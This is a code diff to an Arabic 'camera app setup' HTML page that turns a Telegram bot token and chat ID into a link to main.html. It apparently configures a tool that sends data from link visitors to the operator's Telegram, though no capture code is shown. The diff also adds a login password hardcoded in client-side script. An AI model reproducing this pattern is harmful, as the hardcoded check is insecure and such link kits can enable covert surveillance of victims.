@@ -6,31 +6,33 @@
     <title>إعداد التطبيق</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #f4f4f4;
-            color: #333;
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #8B4513, #A52A2A);
+            color: white;
             text-align: center;
-            padding: 20px;
+            margin: 0;
+            padding: 0;
         }
 
         h1 {
-            color: #444;
+            margin-top: 20px;
+            font-size: 2.5em;
+            color: #FFD700;
         }
 
         .container {
             max-width: 400px;
             margin: 50px auto;
-            background: #fff;
+            background: rgba(0, 0, 0, 0.5);
             padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            border-radius: 10px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
         }
 
         label {
             display: block;
-            margin-bottom: 8px;
-            font-size: 14px;
-            font-weight: bold;
+            margin-bottom: 10px;
+            font-size: 1.2em;
             text-align: left;
         }
 
@@ -39,72 +41,108 @@
             width: 100%;
             padding: 10px;
             margin-bottom: 20px;
-            border: 1px solid #ddd;
+            border: none;
             border-radius: 5px;
+            font-size: 1em;
+            background: #5C4033;
+            color: white;
         }
 
         button {
-            padding: 10px 15px;
-            font-size: 16px;
-            color: #fff;
-            background-color: #007BFF;
+            padding: 10px 20px;
+            font-size: 1.2em;
+            color: white;
+            background: #A52A2A;
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            transition: background-color 0.3s ease;
+            transition: background 0.3s ease;
         }
 
         button:hover {
-            background-color: #0056b3;
+            background: #D2691E;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .error {
+            color: #ffcccc;
+            margin-bottom: 20px;
+        }
+
+        footer {
+            margin-top: 30px;
+            font-size: 0.9em;
+            color: #eee;
         }
 
         .result {
             margin-top: 20px;
             padding: 10px;
-            background: #e9ecef;
+            background: rgba(0, 0, 0, 0.6);
             border-radius: 5px;
             word-wrap: break-word;
         }
 
         a {
-            color: #007BFF;
+            color: #FFD700;
             text-decoration: none;
-        }
-
-        a:hover {
-            text-decoration: underline;
         }
     </style>
 </head>
 <body>
     <h1>إعداد التطبيق</h1>
     <div class="container">
-        <form id="info-form" onsubmit="generateLink(event)">
-            <label for="token">أدخل التوكن:</label>
-            <input type="text" id="token" placeholder="توكن البوت" required>
-            
-            <label for="chat-id">أدخل معرف الشات:</label>
-            <input type="text" id="chat-id" placeholder="معرف الشات" required>
-            
-            <button type="submit">إنشاء الرابط</button>
-        </form>
-        <div id="result" class="result" style="display: none;"></div>
+        <div id="password-container">
+            <label for="password">أدخل كلمة المرور:</label>
+            <input type="password" id="password" placeholder="كلمة المرور">
+            <button onclick="checkPassword()">دخول</button>
+            <p id="error-message" class="error hidden">كلمة المرور غير صحيحة!</p>
+        </div>
+        <div id="form-container" class="hidden">
+            <form id="info-form" onsubmit="generateLink(event)">
+                <label for="token">أدخل التوكن:</label>
+                <input type="password" id="token" placeholder="توكن البوت" required>
+                
+                <label for="chat-id">أدخل معرف الشات:</label>
+                <input type="password" id="chat-id" placeholder="معرف الشات" required>
+                
+                <button type="submit">إنشاء الرابط</button>
+            </form>
+            <div id="result" class="result hidden"></div>
+        </div>
     </div>
+    <footer>© 2024 - إعداد تطبيق الكاميرا</footer>
 
     <script>
+        const PASSWORD = "Q7CamEra7";
+
+        function checkPassword() {
+            const passwordInput = document.getElementById("password");
+            const errorMessage = document.getElementById("error-message");
+            if (passwordInput.value === PASSWORD) {
+                document.getElementById("password-container").classList.add("hidden");
+                document.getElementById("form-container").classList.remove("hidden");
+            } else {
+                errorMessage.classList.remove("hidden");
+            }
+        }
+
         function generateLink(event) {
             event.preventDefault();
             const token = document.getElementById("token").value;
             const chatId = document.getElementById("chat-id").value;
 
-            // إنشاء الرابط
+            // إنشاء الرابط بدون تشفير
             const baseUrl = "main.html";
             const link = `${baseUrl}?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}`;
 
             // عرض الرابط للمستخدم
             const result = document.getElementById("result");
             result.innerHTML = `<strong>رابطك الخاص:</strong> <a href="${link}" target="_blank">${link}</a>`;
-            result.style.display = "block";
+            result.classList.remove("hidden");
         }
     </script>
 </body>
